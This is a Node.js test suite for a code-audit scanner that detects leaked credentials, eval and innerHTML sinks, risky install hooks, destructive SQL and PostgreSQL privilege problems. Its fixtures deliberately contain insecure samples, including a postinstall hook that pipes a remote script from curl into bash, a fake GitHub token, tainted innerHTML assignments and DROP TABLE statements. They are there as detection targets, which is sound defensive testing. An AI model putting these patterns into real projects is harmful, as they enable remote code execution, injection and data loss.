import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile, symlink } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanProject } from "../src/adapters/filesystem/scan-project.js";
import { auditProject } from "../src/adapters/filesystem/audit-project.js";
import { projectRules } from "../src/specialists/project-rules.js";
import { RuleRegistry } from "../src/core/rule-registry.js";
import { ExpertQAEngine } from "../src/core/engine.js";
import projectConfig from "../config/project-audit.config.json" with { type: "json" };
import { formatReport } from "../src/reporters/index.js";

async function runRules(context) {
  const registry = new RuleRegistry();
  for (const rule of projectRules) registry.register(rule);
  return new ExpertQAEngine({ registry, config: projectConfig }).audit(context);
}

test("scanner reads supported source/manifests and parses package metadata", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-scan-"));
  try {
    await mkdir(join(root, "src"));
    await writeFile(join(root, "package.json"), JSON.stringify({ name: "fixture", dependencies: { example: "1.2.3" } }));
    await writeFile(join(root, "package-lock.json"), "{}");
    await writeFile(join(root, "src", "index.js"), "export const answer = 42;\n");
    const scan = await scanProject(root);
    assert.equal(scan.summary.filesRead, 3);
    assert.equal(scan.manifests[0].data.name, "fixture");
    assert.deepEqual(scan.lockFiles, ["package-lock.json"]);
    assert.ok(scan.files.some((file) => file.path === "src/index.js"));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("scanner excludes dependencies, symlinks and local secret-file contents", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-scan-"));
  const outside = await mkdtemp(join(tmpdir(), "jbqa-outside-"));
  try {
    await mkdir(join(root, "node_modules", "fake"), { recursive: true });
    await writeFile(join(root, "src.js"), "export const app = true;");
    await writeFile(join(root, "node_modules", "fake", "index.js"), "eval('not scanned');");
    await writeFile(join(root, ".env"), "API_KEY=must-not-be-read-or-reported\n");
    await writeFile(join(root, ".env.example"), "API_KEY=your_placeholder_value\n");
    await writeFile(join(root, "service-account.json"), '{"private_key":"must-not-be-opened"}');
    await writeFile(join(root, "credentials.json"), '{"password":"must-not-be-opened-either"}');
    await writeFile(join(outside, "outside.js"), "external directory content");
    await symlink(outside, join(root, "linked-folder"), "dir");
    const scan = await scanProject(root);
    assert.equal(scan.files.some((file) => file.path.includes("node_modules")), false);
    assert.equal(scan.files.some((file) => file.path === ".env"), false);
    assert.deepEqual(scan.environmentFiles, [".env"]);
    assert.ok(scan.files.some((file) => file.path === ".env.example"));
    assert.deepEqual(scan.skippedSymlinks, ["linked-folder"]);
    assert.deepEqual(scan.sensitiveFiles, ["credentials.json", "service-account.json"]);
    assert.equal(JSON.stringify(scan).includes("must-not-be-read-or-reported"), false);
    assert.equal(JSON.stringify(scan).includes("must-not-be-opened"), false);
  } finally {
    await rm(root, { recursive: true, force: true });
    await rm(outside, { recursive: true, force: true });
  }
});

test("environment files are excluded case-insensitively", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-env-case-"));
  try {
    await writeFile(join(root, ".ENV"), "API_KEY=uppercase-secret-not-opened");
    const scan = await scanProject(root);
    assert.deepEqual(scan.environmentFiles, [".ENV"]);
    assert.equal(JSON.stringify(scan).includes("uppercase-secret-not-opened"), false);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("scanner applies size limits and rejects a file as its root", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-scan-"));
  try {
    await writeFile(join(root, "large.js"), "x".repeat(100));
    const scan = await scanProject(root, { maxFileBytes: 10 });
    assert.equal(scan.summary.filesRead, 0);
    assert.equal(scan.oversizedFiles.length, 1);
    await assert.rejects(scanProject(join(root, "large.js")), /real directory/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("security findings detect credential formats but redact values from reports", async () => {
  const secret = "ghp_" + "A".repeat(36);
  const report = await runRules({
    projectFiles: [{
      path: "src/config.js", extension: ".js", lineCount: 1,
      content: 'const GITHUB_TOKEN = "' + secret + '";'
    }],
    projectScan: { environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const finding = report.diagnostics.find((item) => item.id.startsWith("SEC-SECRET-"));
  assert.ok(finding);
  assert.equal(finding.severity, "critical");
  assert.equal(finding.evidence.redacted, true);
  assert.equal(JSON.stringify(report).includes(secret), false);
});

test("generic access-token assignments are detected and redacted", async () => {
  const secret = "generic-access-token-value-123";
  const report = await runRules({
    projectFiles: [{
      path: "src/auth.js", extension: ".js", lineCount: 1,
      content: 'const ACCESS_TOKEN = "' + secret + '";'
    }],
    projectScan: { environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("SEC-SECRET-")), true);
  assert.equal(JSON.stringify(report).includes(secret), false);
});

test("security checks ignore placeholders and detect dynamic code and HTML sinks", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "src/app.js", extension: ".js", lineCount: 4,
      content: [
        'const API_KEY = "your_placeholder_value";',
        "const result = eval(userInput);",
        "element.innerHTML = value;",
        "// eval(commentedOut);"
      ].join("\n")
    }],
    projectScan: { environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("SEC-SECRET-")), false);
  assert.equal(report.diagnostics.some((item) => item.title === "Dynamic eval execution"), true);
  assert.equal(report.diagnostics.some((item) => item.title === "Dynamic HTML sink requires manual review"), true);
});

test("HTML sink analysis distinguishes static markup, escaping helpers and untrusted input", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "src/html-sinks.js", extension: ".js", lineCount: 10,
      content: [
        "function esc(value) { return String(value).replace(/[&<>]/g, ''); }",
        "function productTable(rows) { return rows.map((row) => '<p>' + esc(row.name) + '</p>').join(''); }",
        "staticNode.innerHTML = '<p>Loading</p>';",
        "safeNode.innerHTML = '<p>' + esc(userInput) + '</p>';",
        "component.innerHTML = productTable(rows);",
        "rawNode.innerHTML = event.target.value;",
        "templateNode.innerHTML = `<p>${location.hash}</p>`;",
        "unknownNode.innerHTML = rawMarkup;",
        "// commentedNode.innerHTML = event.target.value;"
      ].join("\n")
    }],
    projectScan: { environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const htmlFindings = report.diagnostics.filter((item) => item.metadata.detector === "html-sink-context");
  assert.equal(htmlFindings.length, 5);
  assert.equal(htmlFindings.some((item) => item.location === "src/html-sinks.js:3"), false);
  assert.equal(htmlFindings.filter((item) => item.severity === "info").length, 2);
  assert.equal(htmlFindings.filter((item) => item.severity === "high").length, 2);
  assert.equal(htmlFindings.filter((item) => item.severity === "medium").length, 1);
  assert.ok(htmlFindings.some((item) => item.location === "src/html-sinks.js:6" && item.severity === "high"));
  assert.ok(htmlFindings.some((item) => item.location === "src/html-sinks.js:7" && item.severity === "high"));
  assert.ok(htmlFindings.some((item) => item.location === "src/html-sinks.js:8" && item.severity === "medium"));
  assert.equal(htmlFindings.every((item) => item.metadata.requiresManualReview === true), true);
});

test("dependency checks identify floating versions, absent locks and risky install hooks", async () => {
  const report = await runRules({
    projectFiles: [],
    projectScan: { lockFiles: [] },
    packageManifests: [{
      path: "package.json", parseError: null,
      data: {
        dependencies: { "some-package": "latest" },
        scripts: { postinstall: "curl https://example.invalid/install.sh | bash" }
      }
    }]
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DEP-FLOAT-")), true);
  assert.equal(report.diagnostics.some((item) => item.id === "DEP-LOCK-001"), true);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DEP-LIFECYCLE-")), true);
});

test("database checks flag destructive SQL, SECURITY DEFINER and unsafe raw-query calls", async () => {
  const report = await runRules({
    projectFiles: [
      { path: "migrations/002.sql", extension: ".sql", lineCount: 2, content: "DROP TABLE customers;\nCREATE FUNCTION run_job() SECURITY DEFINER AS $$ SELECT 1; $$ LANGUAGE SQL;" },
      { path: "src/db.ts", extension: ".ts", lineCount: 1, content: "return prisma.$queryRawUnsafe(query);" }
    ],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-DESTRUCTIVE-")), true);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-POSTGRES-")), true);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-RAW-")), true);
});

test("JavaScript unsafe raw database query APIs are detected from AST calls, including computed properties", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "src/database.js",
      extension: ".js",
      lineCount: 5,
      content: [
        "// prisma.$queryRawUnsafe(query);",
        "const rows = await prisma.$queryRawUnsafe(query);",
        'const result = await prisma["$executeRawUnsafe"](query);',
        'const safe = await prisma.$queryRaw("SELECT * FROM users WHERE id = ?", [id]);'
      ].join("\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });

  const rawFindings = report.diagnostics.filter((item) => item.id.startsWith("DB-RAW-AST-"));
  assert.equal(rawFindings.length, 2);
  assert.deepEqual(rawFindings.map((item) => item.metadata.sink).sort(), [
    "$executeRawUnsafe",
    "$queryRawUnsafe"
  ]);
  assert.ok(rawFindings.every((item) => item.metadata.parser === "Acorn"));
  assert.ok(rawFindings.every((item) => item.metadata.requiresManualReview === true));
});


test("Prisma relation fields without a supporting leading index are reported", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "prisma/schema.prisma",
      extension: ".prisma",
      lineCount: 16,
      content: [
        "model Order {",
        "  id String @id",
        "  ownerId String",
        "  owner User @relation(fields: [ownerId], references: [id])",
        "}",
        "",
        "model Invoice {",
        "  id String @id",
        "  customerId String",
        "  customer Customer @relation(fields: [customerId], references: [id])",
        "  @@index([customerId, createdAt])",
        "}"
      ].join("\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const missing = report.diagnostics.filter((item) => item.id.startsWith("DB-PRISMA-INDEX-"));
  assert.equal(missing.length, 1);
  assert.match(missing[0].id, /Order-ownerId/);
  assert.equal(missing[0].metadata.foreignKeyField, "ownerId");
  assert.equal(missing[0].severity, "medium");
});

test("PostgreSQL rules flag broad PUBLIC grants and elevated role attributes", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "migrations/003_permissions.sql",
      extension: ".sql",
      lineCount: 4,
      content: [
        "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO PUBLIC;",
        "CREATE ROLE app_runtime WITH LOGIN NOSUPERUSER;",
        "ALTER ROLE app_runtime WITH BYPASSRLS;",
        "GRANT CREATE ON SCHEMA public TO PUBLIC;"
      ].join("\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.filter((item) => item.id.startsWith("DB-PUBLIC-GRANT-")).length, 2);
  assert.equal(report.diagnostics.filter((item) => item.id.startsWith("DB-PRIVILEGED-ROLE-")).length, 1);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-PRIVILEGED-ROLE-") && item.severity === "high"), true);
});

test("SECURITY DEFINER search_path is evaluated per function, not per file", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "migrations/004_functions.sql",
      extension: ".sql",
      lineCount: 6,
      content: [
        "CREATE FUNCTION safe_job() RETURNS integer",
        "LANGUAGE sql SECURITY DEFINER SET search_path = pg_catalog",
        "AS $ SELECT 1; $;",
        "CREATE FUNCTION unsafe_job() RETURNS integer",
        "LANGUAGE sql SECURITY DEFINER",
        "AS $ SELECT 2; $;"
      ].join("\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const findings = report.diagnostics.filter((item) => item.id.startsWith("DB-POSTGRES-001-"));
  assert.equal(findings.length, 1);
  assert.match(findings[0].location, /004_functions\.sql:4/);
});

test("SQL foreign keys without a supporting index are reported across migration files", async () => {
  const report = await runRules({
    projectFiles: [
      {
        path: "migrations/005_tables.sql",
        extension: ".sql",
        lineCount: 5,
        content: [
          "CREATE TABLE public.orders (",
          "  id bigint PRIMARY KEY,",
          "  customer_id bigint,",
          "  CONSTRAINT orders_customer_fk FOREIGN KEY (customer_id) REFERENCES public.customers(id)",
          ");"
        ].join("\n")
      },
      {
        path: "migrations/006_indexes.sql",
        extension: ".sql",
        lineCount: 1,
        content: "CREATE INDEX invoices_customer_created_idx ON public.invoices (customer_id, created_at);"
      }
    ],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const findings = report.diagnostics.filter((item) => item.id.startsWith("DB-FK-INDEX-"));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].metadata.table, "public.orders");
  assert.deepEqual(findings[0].metadata.foreignKeyColumns, ["customer_id"]);
});

test("indexed SQL foreign keys are not flagged and concurrent indexes cannot be in explicit transactions", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "migrations/007_indexed.sql",
      extension: ".sql",
      lineCount: 5,
      content: [
        "BEGIN;",
        "CREATE INDEX CONCURRENTLY orders_status_idx ON public.orders(status);",
        "ALTER TABLE public.invoices ADD CONSTRAINT invoices_customer_fk FOREIGN KEY (customer_id) REFERENCES customers(id);",
        "CREATE INDEX invoices_customer_idx ON public.invoices(customer_id);",
        "COMMIT;"
      ].join("\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.filter((item) => item.id.startsWith("DB-FK-INDEX-")).length, 0);
  const concurrent = report.diagnostics.filter((item) => item.id.startsWith("DB-CONCURRENT-INDEX-"));
  assert.equal(concurrent.length, 1);
  assert.equal(concurrent[0].severity, "high");
});

test("SQL inline REFERENCES declarations are reviewed for an index", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "migrations/008_inline_fk.sql",
      extension: ".sql",
      lineCount: 4,
      content: [
        "CREATE TABLE public.order_items (",
        "  id bigint PRIMARY KEY,",
        "  order_id bigint NOT NULL REFERENCES public.orders(id)",
        ");"
      ].join("\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const findings = report.diagnostics.filter((item) => item.id.startsWith("DB-FK-INDEX-"));
  assert.equal(findings.length, 1);
  assert.deepEqual(findings[0].metadata.foreignKeyColumns, ["order_id"]);
});

test("scanner marks the result truncated when it reaches the depth limit", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-depth-"));
  try {
    await mkdir(join(root, "level-1", "level-2"), { recursive: true });
    await writeFile(join(root, "level-1", "level-2", "deep.js"), "export const deep = true;");
    const scan = await scanProject(root, { maxDepth: 1 });
    assert.equal(scan.summary.truncated, true);
    assert.equal(scan.files.some((file) => file.path.endsWith("deep.js")), false);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("an incomplete project scan blocks a passing result", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-incomplete-"));
  try {
    await mkdir(join(root, "level-1", "level-2"), { recursive: true });
    await writeFile(join(root, "level-1", "level-2", "deep.js"), "export const deep = true;");
    const report = await auditProject(root, { scanOptions: { maxDepth: 1 } });
    assert.equal(report.analysisScope.complete, false);
    assert.equal(report.analysisScope.coverage.truncated, true);
    assert.ok(report.analysisScope.incompleteReasons.length > 0);
    assert.equal(report.scoring.blockedByCritical, true);
    assert.equal(report.scoring.passed, false);
    assert.ok(report.diagnostics.some((item) => item.id === "CODE-SCAN-001"));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("oversized files also block a complete-pass result", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-oversized-"));
  try {
    await writeFile(join(root, "src.js"), "export const tooLarge = true;");
    const report = await auditProject(root, { scanOptions: { maxFileBytes: 1 } });
    assert.equal(report.analysisScope.complete, false);
    assert.equal(report.analysisScope.coverage.oversizedFiles, 1);
    assert.equal(report.scoring.blockedByCritical, true);
    assert.equal(report.scoring.passed, false);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("end-to-end project audit returns a safe report and exports Markdown/HTML", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-project-"));
  const secret = "ghp_" + "B".repeat(36);
  try {
    await mkdir(join(root, "src"));
    await writeFile(join(root, "package.json"), JSON.stringify({
      name: "fixture-erp", version: "1.0.0", dependencies: { "unsafe-example": "*" }
    }, null, 2));
    await writeFile(join(root, "src", "service.js"),
      'const GITHUB_TOKEN = "' + secret + '";\nconst output = eval(input);\n');
    await writeFile(join(root, "migrate.sql"), "DROP TABLE invoice_history;\n");
    await writeFile(join(root, ".env"), "TOKEN=not-read\n");

    const report = await auditProject(root);
    const serialized = JSON.stringify(report);
    assert.equal(report.target.project.startsWith("jbqa-project-"), true);
    assert.equal(report.summary.rulesExecuted, 28);
    assert.ok(report.diagnostics.some((item) => item.severity === "critical"));
    assert.equal(serialized.includes(secret), false);
    assert.equal(serialized.includes("not-read"), false);
    assert.equal(report.projectScan.environmentFiles, 1);
    assert.equal(report.analysisScope.networkRequests, 0);
    assert.equal(report.analysisScope.dependencyAdvisoryLookup, false);
    assert.equal(report.dependencyAdvisories.status, "disabled");
    assert.equal(report.dependencyAdvisories.networkRequests, 0);
    assert.match(formatReport(report, "markdown"), /Project files read/);
    assert.match(formatReport(report, "html"), /Target: <code>jbqa-project-/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("project audit rejects an empty path", async () => {
  await assert.rejects(auditProject(" "), /directory path is required/);
});


test("project audit identifies only review-candidate exports without static in-repository importers", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-dead-exports-"));
  try {
    await mkdir(join(root, "src"), { recursive: true });
    await writeFile(join(root, "src", "utilities.js"), [
      "export function usedInProject(value) { return value + 1; }",
      "export function possibleOrphan(value) { return value * 2; }"
    ].join("\n"));
    await writeFile(join(root, "src", "app.js"), [
      'import { usedInProject } from "./utilities.js";',
      "export const result = usedInProject(41);"
    ].join("\n"));
    await writeFile(join(root, "src", "index.js"), [
      "export { possiblePublicApi } from './public-api.js';"
    ].join("\n"));
    await writeFile(join(root, "src", "public-api.js"), "export const possiblePublicApi = true;");

    const report = await auditProject(root);
    const candidates = report.diagnostics.filter((item) => item.id.startsWith("CODE-DEAD-EXPORT-") &&
      item.id !== "CODE-DEAD-EXPORT-PARSE-SKIPPED" &&
      item.id !== "CODE-DEAD-EXPORT-ANALYSIS-SKIPPED");
    assert.equal(candidates.length, 1);
    assert.ok(candidates.every((item) => item.severity === "info"));
    assert.ok(candidates.some((item) => item.evidence.exportName === "possibleOrphan"));
    assert.equal(candidates.some((item) => item.evidence.exportName === "possiblePublicApi"), false);
    assert.ok(candidates.every((item) => item.metadata.safeToDeleteAutomatically === false));
    assert.equal(report.analysisScope.deadCodeAnalysis.status, "heuristic-complete");
    assert.equal(report.analysisScope.deadCodeAnalysis.possibleUnusedExports, 1);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("dynamic module loading suppresses dead-export claims and reports reduced coverage", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-dynamic-imports-"));
  try {
    await mkdir(join(root, "src"), { recursive: true });
    await writeFile(join(root, "src", "utilities.js"), "export const possibleOrphan = true;");
    await writeFile(join(root, "src", "loader.js"), "const moduleName = getModuleName(); await import(moduleName);");

    const report = await auditProject(root);
    assert.equal(report.diagnostics.some((item) => item.id.startsWith("CODE-DEAD-EXPORT-") &&
      item.id !== "CODE-DEAD-EXPORT-ANALYSIS-SKIPPED"), false);
    assert.ok(report.diagnostics.some((item) => item.id === "CODE-DEAD-EXPORT-ANALYSIS-SKIPPED"));
    assert.equal(report.analysisScope.deadCodeAnalysis.status, "partial");
    assert.equal(report.analysisScope.deadCodeAnalysis.coverageWarnings, 1);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
